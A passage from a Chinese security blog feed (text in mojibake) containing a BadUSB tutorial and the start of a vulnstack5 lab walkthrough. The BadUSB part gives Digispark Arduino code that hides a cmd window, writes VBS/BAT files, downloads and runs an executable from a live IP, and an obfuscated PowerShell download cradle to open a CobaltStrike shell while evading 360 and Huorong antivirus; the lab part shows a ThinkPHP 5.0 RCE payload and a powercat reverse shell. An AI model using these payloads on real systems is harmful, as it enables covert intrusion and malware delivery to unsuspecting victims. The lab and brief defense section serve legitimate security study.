class="comment">//å¼€å¯CapsLockå¤§å†™é”å®šé”®</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//æŒ‰ä¸‹Win+Ré”®</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">800</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MODE CON: cols=16 lines=1 &amp;&amp; color fe&quot;</span>);<span class="comment">//å°½å¯èƒ½éšè—cmdçª—å£</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">100</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO SET WS=wsCRIPT.cREATEoBJECT(\&quot;wsCRIPT.sHELL\&quot;) &gt; MICROSOFT.VBS&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO WS.rUN\&quot;CMD.EXE /C MKDIR C:\\TEMP1 &amp;&amp; BITSADMIN  /TRANSFER N HTTP://43.139.114.127:888/qq_CACHE.ZIP C:\\TEMP1\\qq_CACHE.ZIP &amp;&amp; EXPAND C:\\TEMP1\\qq_CACHE.ZIP C:\\TEMP1\\qq_CACHE.EXE &amp;&amp; DEL C:\\TEMP1\\qq_CACHE.ZIP &amp;&amp; C:\\TEMP1\\qq_CACHE.EXE\&quot;,0 &gt;&gt;MICROSOFT.VBS&quot;</span>);<span class="comment">//å°†å‘½ä»¤ä»£ç å†™å…¥vbsæ–‡ä»¶</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MICROSOFT.VBS&quot;</span>);<span class="comment">//æ‰§è¡Œvbsæ–‡ä»¶</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;exit&quot;</span>);<span class="comment">//é€€å‡ºcmd</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//å…³é—­CapsLockå¤§å†™é”å®šé”®</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¹‹å‰ä»æœªæ¥è§¦è¿‡Arduinoï¼Œå› æ­¤æˆ‘åœ¨åˆ¶ä½œæ—¶ï¼Œç»å¤§éƒ¨åˆ†çš„æ—¶é—´æµªè´¹åœ¨äº†ç¼–å†™Arduinoä»£ç çš„éƒ¨åˆ†ã€‚è¿™é‡Œæä¸€ä¸‹æˆ‘é‡åˆ°çš„é—®é¢˜å§ã€‚</p><p>é¦–å…ˆæ˜¯ä¸­æ–‡è¾“å…¥æ³•æ‰€å¯¼è‡´çš„å‘½ä»¤è¾“å…¥ä¸æˆåŠŸã€‚è§£å†³åŠæ³•å¾ˆç®€å•ï¼Œå°±æ˜¯æŒ‰ä¸‹CapsLockï¼Œå› ä¸ºWindowså¤§å°å†™ä¸æ•æ„Ÿã€‚CapsLocké”®åœ¨DigiKeyboard.håº“ä¸­æ˜¯57ã€‚</p><p>æ¥ç€å‘¢å°±æ˜¯DigiKeyboardçš„ä¸€äº›æ–¹æ³•çš„è°ƒç”¨äº†ã€‚å…¶å®ç½‘ä¸Šæœç´¢ä¸€æ³¢<code>DigiKeyboard.h</code>å°±å¯ä»¥æ‰¾åˆ°æºä»£ç ï¼š<a href="https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h">https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h</a>ã€‚å®¡è®¡ä¸€ä¸‹æºä»£ç å°±çŸ¥é“äº†ã€‚</p><p>ç”¨ç§’è¡¨æµ‹äº†ä¸€ä¸‹ï¼Œæ’å…¥USB 14ç§’å·¦å³å…¨éƒ¨å‘½ä»¤å³å¯è¢«æ‰§è¡Œå®Œæˆï¼Œæ‰§è¡Œå®Œå‘½ä»¤åå°±å¯ä»¥æ‹”å‡ºUSBäº†ã€‚</p><p>æ¥ä¸‹æ¥è¯·çœ‹æ•ˆæœï¼š</p><p><a href="https://watch.wave.video/4Ao60qmNYCgQx2ZI">https://watch.wave.video/4Ao60qmNYCgQx2ZI</a></p><h2 id="Bypass-360"><a href="#Bypass-360" class="headerlink" title="Bypass 360"></a>Bypass 360</h2><p>æ¥ç€å°±æ˜¯è‰°éš¾çš„ç»•è¿‡360äº†ã€‚å½“æˆ‘æ»¡å¿ƒæ¬¢å–œåœ°æ‹¿ç€å¯ä»¥ç»•è¿‡ç«ç»’çš„BadUSBæ¥æ’å…¥è£…æœ‰360çš„è™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œæˆ‘å‘ç°åœ¨æ‰§è¡Œvbsæ–‡ä»¶çš„é‚£ä¸€æ­¥å‘½ä»¤çš„æ—¶å€™360å°±ç»™æˆ‘æ‹¦ä½äº†ã€‚å¯„ï¼</p><p><a href="https://pic.imgdb.cn/item/6388ce6816f2c2beb1d0c3de.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388ce6816f2c2beb1d0c3de.png"></a></p><p>å¹¶ä¸”360ä¼šå¯¹bitsadminå‘½ä»¤æå‡ºè­¦å‘Šï¼Œä¹Ÿä¼šå¯¹expandè§£å‹ä¸‹è½½ä¸‹æ¥çš„zipæ–‡ä»¶çš„æ“ä½œè¿›è¡Œè­¦å‘Šã€‚å› æ­¤360ä¼¼ä¹æœ‰ç‚¹éš¾ç»•ï¼ˆå°½ç®¡æˆ‘ä»¬ä¸Šé¢ç”Ÿæˆçš„exeé©¬360ä¹Ÿæ£€æµ‹ä¸åˆ°ï¼Œä½†æ˜¯æŠŠå®ƒä¼ å…¥åˆ°ç”¨æˆ·çš„PCä¸Šä¼¼ä¹å¹¶ä¸æ˜¯ä¸€ä»¶æ˜“äº‹ï¼‰ã€‚é‚£æˆ‘ä»¬å°±å¾—æ¢ä¸€ä¸ªæ€è·¯äº†ï¼Œæˆ‘è¿™é‡Œæƒ³åˆ°çš„æ€è·¯æ˜¯é€šè¿‡powershellæ‰§è¡ŒCobaltStrikeçš„å‘½ä»¤æ¥æ‹¿åˆ°shellã€‚</p><h3 id="powershellå…æ€"><a href="#powershellå…æ€" class="headerlink" title="powershellå…æ€"></a>powershellå…æ€</h3><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå„ä¸ªæ€æ¯’è½¯ä»¶å¯¹äºpowershellæ‰§è¡Œå‘½ä»¤éƒ½åšäº†ä¸¥æ ¼çš„è¿‡æ»¤å’Œé™åˆ¶ï¼Œå› æ­¤ç›´æ¥æ‰§è¡Œpowershellå‘½ä»¤è‚¯å®šä¼šè¢«360æ£€æµ‹åˆ°å¹¶å¼¹å‡ºè­¦å‘Šã€‚è¿™å°±éœ€è¦æˆ‘ä»¬è¿›è¡Œpowershellæ··æ·†äº†ã€‚è¿™é‡Œç›´æ¥ç»™å‡ºpayloadï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">Invoke-Expression</span>(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://43.139.114.127:1235/a&#x27;</span>) | powershell -</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/6388ce7616f2c2beb1d0d2b7.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/6388ce7616f2c2beb1d0d2b7.png"></a></p><p>æˆåŠŸç»•è¿‡360ä¸ç«ç»’ï¼Œä¸Šçº¿CSã€‚</p><h3 id="ç¼–å†™bat"><a href="#ç¼–å†™bat" class="headerlink" title="ç¼–å†™bat"></a>ç¼–å†™bat</h3><p>è™½ç„¶ä¸Šé¢çš„powershellå‘½ä»¤æ··æ·†å¯ä»¥ç»•è¿‡360ï¼Œä½†æ˜¯ä¼¼ä¹æœ‰ä¸€ä¸ªç—›ç‚¹ã€‚é‚£å°±æ˜¯å¦‚æœæ‰§è¡Œpowershellåï¼Œcmdçª—å£ä¼šä¸€ç›´å­˜åœ¨ã€‚è¦æ˜¯cmdçª—å£è¢«å…³æ‰äº†ï¼Œé‚£shellä¸å°±ç™½æ‹¿äº†å—ï¼Ÿå› æ­¤æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•ä¸å¼¹cmdçª—å£ï¼Œè®©å—å®³è€…éš¾ä»¥å‘ç°ï¼Œåšåˆ°â€œæ¶¦ç‰©ç»†æ— å£°â€ã€‚è¿™é‡Œæˆ‘æ‰¾åˆ°çš„æ–¹æ³•æ˜¯è·Ÿä¸Šé¢ç»•è¿‡ç«ç»’çš„æ–¹æ³•ç±»ä¼¼ï¼Œä½†æ˜¯ä¸å†æ˜¯ç¼–å†™vbsæ–‡ä»¶äº†ï¼ˆå› ä¸º360å¯¹äºvbsæ–‡ä»¶çš„æ£€æµ‹è¿‡äºä¸¥æ ¼ï¼‰ï¼Œè€Œæ˜¯ç¼–å†™batæ–‡ä»¶ã€‚batæ–‡ä»¶ä¹Ÿå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒåŒæ—¶å¯ä»¥æ·»åŠ ä¸€äº›å‘½ä»¤è®©å‘½ä»¤è¡Œçª—å£æ¶ˆå¤±ï¼Œå†åŠ ä¸Š360å¯¹äºbatæ–‡ä»¶çš„æ£€æµ‹è¾ƒä¸ºå®½æ¾ï¼Œå› æ­¤å°†å‘½ä»¤å†™å…¥batæ–‡ä»¶å°±æˆäº†æˆ‘çš„é¦–é€‰ã€‚</p><p>ç›´æ¥ç»™å‡ºbatæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off </span><br><span class="line">if &quot;%1&quot;==&quot;h&quot; goto begin </span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close) </span><br><span class="line">EXIT</span><br><span class="line">:begin </span><br><span class="line">cmd /k &quot;echo Invoke-Expression(new-object net.webclient).downloadstring(&#x27;http://43.139.114.127:1235/a&#x27;) | powershell -&quot; </span><br></pre></td></tr></table></figure><h3 id="ç¼–å†™Arduino"><a href="#ç¼–å†™Arduino" class="headerlink" title="ç¼–å†™Arduino"></a>ç¼–å†™Arduino</h3><p>æ¥ç€ç»™å‡ºArduinoä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_M);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_D);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_N);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">51</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_S);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">46</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">30</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">35</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_I);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_N);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_S);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">46</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">30</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">36</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">36</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_F);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO @ECHO OFF &gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO IF \&quot;%1\&quot;==\&quot;H\&quot; GOTO BEGIN &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;SET/P=MSHTA VBSCRIPT:CREATEOBJECT(\&quot;WSCRIPT.SHELL\&quot;).RUN(\&quot;%~NX0 H\&quot;,0)(WINDOW.CLOSE)&gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;S&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO. &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_H);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_X);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_I);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_T);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;&gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO :BEGIN &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO CMD /K \&quot;ECHO iNVOKE-eXPRESSION(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING(&#x27;HTTP://43.139.114.127:1235/A&#x27;) | POWERSHELL -\&quot; &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªä»£ç ç›¸è¾ƒBypass ç«ç»’çš„æ¥è¯´é•¿äº†ä¸å°‘ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘é‡åˆ°äº†ä¸€ä¸ªéš¾ä»¥è§£å†³çš„é—®é¢˜ã€‚é‚£å°±æ˜¯æˆ‘ä¼¼ä¹ä¸èƒ½ç›´æ¥å†™å‡ºä¸‹é¢è¿™è¡Œä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DigiKeyboard.println(&quot;MODE CON: cols=16 lines=1 &amp;&amp; color fe&quot;);</span><br></pre></td></tr></table></figure><p>å½“æˆ‘çš„ä»£ç ä¸­æœ‰è¿™ä¸€è¡Œçš„æ—¶å€™æ— æ³•çƒ§å½•æˆåŠŸï¼ˆä½†æ˜¯æˆ‘åœ¨ä¸Šé¢ç»•è¿‡ç«ç»’éƒ¨åˆ†å†™çš„Arduinoä»£ç å´å¯ä»¥ç›´æ¥å†™è¿™ä¸€è¡Œä»£ç ï¼‰ã€‚å› æ­¤æˆ‘æ‰¾åˆ°äº†DigiKeyboard.hçš„æŒ‰é”®å¯¹ç…§è¡¨ï¼š<a href="https://bobmckay.com/wp-content/uploads/2022/07/Hut1_12v2.pdf">https://bobmckay.com/wp-content/uploads/2022/07/Hut1_12v2.pdf</a>ã€‚åœ¨æ–‡ä»¶çš„ç¬¬53é¡µå¼€å§‹ï¼Œå†™äº†æ¯ä¸ªæŒ‰é”®ç›¸å¯¹åº”çš„æ•°å­—ï¼Œåˆ©ç”¨sendKeyStrokeæ–¹æ³•è°ƒç”¨ã€‚</p><p>ä»£ç è™½ç„¶é•¿ï¼Œä½†æ˜¯å®é™…åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„ä»£ç ä¹Ÿå¹¶æœªå¢å¤šã€‚</p><p>ä»¥ä¸‹æ˜¯æ¼”ç¤ºæ•ˆæœï¼š</p><p><a href="https://watch.wave.video/MnKvDgds25bwtIoc">https://watch.wave.video/MnKvDgds25bwtIoc</a></p><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><p>åœ¨åŸç†åˆ†æä¸­æåˆ°ï¼Œæ¶æ„ä»£ç å†™å…¥åœ¨è®¾å¤‡åˆå§‹åŒ–å›ºä»¶ä¸­ï¼Œè€Œä¸æ˜¯é€šè¿‡autorun.infç­‰åª’ä½“è‡ªåŠ¨æ’­æ”¾æ–‡ä»¶è¿›è¡Œæ§åˆ¶ï¼Œå› æ­¤æ— æ³•é€šè¿‡ç¦ç”¨åª’ä½“è‡ªåŠ¨æ’­æ”¾è¿›è¡Œé˜²å¾¡ï¼Œå¹¶ä¸”è¿™éƒ¨åˆ†åŒºåŸŸæ˜¯æ€æ¯’è½¯ä»¶æ— æ³•è®¿é—®çš„åŒºåŸŸï¼Œ æ‰€ä»¥æ€æ¯’è½¯ä»¶æ›´æ˜¯æ— æ³•æ£€æµ‹è®¾å¤‡å›ºä»¶ä¸­çš„æ¶æ„ä»£ç ã€‚</p><p>å› ä¸ºæ— æ³•é˜»æ­¢ç”µè„‘è¯†åˆ«é”®ç›˜ã€é¼ æ ‡æˆ–Uç›˜æ­¤ç±»HIDè®¾å¤‡ï¼Œæ‰€ä»¥ç›®å‰ä»ç„¶æ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆçš„æŠ€æœ¯æ‰‹æ®µå»é˜²å¾¡BadUSBã€‚å°½ç®¡360å®‰å…¨å«å£«å·²ç»å¼€å‘å‡ºæ‰€è°“çš„é˜²å¾¡BadUSBçš„åŠŸèƒ½â€”â€”â€œå˜å½¢è™«é˜²æŠ¤â€äº†ï¼Œä½†åœ¨æˆ‘åœ¨æœ¬åœ°å°è¯•è¿™ä¸ªåŠŸèƒ½æ—¶ä»ç„¶å¯ä»¥get shellã€‚</p><p>å› æ­¤é¢å¯¹è¿™ç§æ”»å‡»ï¼Œæˆ‘ä»¬åªèƒ½æé«˜è‡ªèº«çš„å®‰å…¨æ„è¯†ï¼Œä¸å› ä¸ºå¥½å¥‡å¿ƒè€Œå»ä¹±æ’å¯ç–‘çš„Uç›˜ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¸ªäººè®¤ä¸ºåªæœ‰æ‹¥æœ‰åŸºç¡€çš„å®‰å…¨çŸ¥è¯†ï¼Œé‚£ä¹ˆBadUSBçš„åˆ¶ä½œè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå¯¹äºæˆ‘è€Œè¨€æœ€å¤æ‚çš„å¯èƒ½å°±æ˜¯ç¼–å†™Arduinoä»£ç é‚£éƒ¨åˆ†äº†ã€‚åŒæ—¶ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨DigiKeyboard.håº“ï¼Œå› æ­¤æŸ¥é˜…äº†ä¸å°‘èµ„æ–™ã€‚ä¸è¿‡è¿™æ¬¡åˆ¶ä½œå®Œæˆä¹‹åï¼Œä¹Ÿç®—å…¥äº†Arduinoçš„é—¨äº†ï¼Œå¸Œæœ›ä»¥åå¯ä»¥ç”¨Arduinoå†™å‡ºä¸€äº›å¥½ç©çš„ä¸œè¥¿å§ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€â€”â€”vulnstack5</title>
      <link href="/2022/11/08/vulnstack5/"/>
      <url>/2022/11/08/vulnstack5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>é¶åœºä¸‹è½½åœ°å€ï¼š<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></p><h2 id="ç¯å¢ƒéƒ¨ç½²ï¼š"><a href="#ç¯å¢ƒéƒ¨ç½²ï¼š" class="headerlink" title="ç¯å¢ƒéƒ¨ç½²ï¼š"></a>ç¯å¢ƒéƒ¨ç½²ï¼š</h2><h3 id="Win7"><a href="#Win7" class="headerlink" title="Win7"></a>Win7</h3><p>Win7åšWebæœåŠ¡å™¨ï¼Œæœ‰ä¸¤æ¡ç½‘å¡ï¼Œåˆ†åˆ«è¿é€šå†…å¤–ç½‘ï¼š</p><p><a href="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752474c458853aef4009ea.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å†…ç½‘IPï¼š192.168.138.136</span><br><span class="line">å¤–ç½‘IPï¼š192.168.135.150</span><br><span class="line">æ³¨æ„æ‰‹åŠ¨æ‰“å¼€phpstudy</span><br></pre></td></tr></table></figure><h3 id="Windows-2008"><a href="#Windows-2008" class="headerlink" title="Windows 2008"></a>Windows 2008</h3><p>Windows 2008åªæœ‰ä¸€ä¸ªç½‘å¡è¿æ¥ï¼Œå¤„äºå†…ç½‘æ— æ³•ä¸å¤–ç½‘é€šä¿¡ï¼š</p><p><a href="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752484c458853aef403e3e.jpg"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å†…ç½‘IPï¼š192.168.138.138</span><br></pre></td></tr></table></figure><h3 id="æ”»å‡»æœºï¼š"><a href="#æ”»å‡»æœºï¼š" class="headerlink" title="æ”»å‡»æœºï¼š"></a>æ”»å‡»æœºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¤–ç½‘IPï¼š192.168.135.128</span><br></pre></td></tr></table></figure><p>VMnet2ç½‘å¡è®¾ç½®å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65752494c458853aef407636.jpg"></a></p><h2 id="å¤–ç½‘æ¸—é€ï¼š"><a href="#å¤–ç½‘æ¸—é€ï¼š" class="headerlink" title="å¤–ç½‘æ¸—é€ï¼š"></a>å¤–ç½‘æ¸—é€ï¼š</h2><p><a href="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575249fc458853aef409a39.jpg"></a></p><p>è¿›å…¥ç½‘é¡µåï¼Œå¯ä»¥å‘ç°éƒ¨ç½²çš„æ˜¯5.0ç‰ˆæœ¬çš„ThinkPHPï¼Œå»ç½‘ä¸Šæœä¸€æœèƒ½å‘ç°ä¸å°‘payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç½‘ä¸Šçš„payloadæ‰“ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524abc458853aef40c2d9.jpg"></a></p><p>RCEæˆåŠŸã€‚æ¥ä¸‹æ¥åˆ©ç”¨powercatåå¼¹ä¸€ä¸‹shellï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=powershell.exe IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.135.128:1235/powercat.ps1&#x27;);powercat -c 192.168.135.128 -p 1234 -e cmd.exe</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/657524bbc458853aef41018c.jpg"></a></p><p><a href="https://pic.imgdb.cn/item/657524c8c458853aef412cdc.jpg" class="gallery-item"><img 